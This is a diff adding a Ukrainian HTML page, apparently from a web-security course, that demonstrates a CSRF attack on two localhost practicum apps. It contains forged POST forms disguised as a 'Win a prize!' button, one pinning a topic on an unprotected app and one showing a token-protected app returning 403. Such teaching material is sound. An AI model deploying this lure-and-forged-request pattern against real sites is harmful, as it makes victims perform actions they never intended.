@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <title>Демонстрація CSRF-атаки</title>
+</head>
+<body>
+    <h1>Шкідлива сторінка (демонстрація CSRF)</h1>
+
+    <p>Атака на практикум №6 (без захисту): закріплює тему з id=1 від імені відвідувача.</p>
+    <form method="post" action="http://127.0.0.1:8000/api.php?resource=topics&action=pin&id=1">
+        <button type="submit">Виграти приз!</button>
+    </form>
+
+    <p>Атака на практикум №8 (із CSRF-токеном): сервер має відповісти 403.</p>
+    <form method="post" action="http://127.0.0.1:8000/pin.php">
+        <input type="hidden" name="id" value="1">
+        <button type="submit">Виграти приз!</button>
+    </form>
+</body>
+</html>
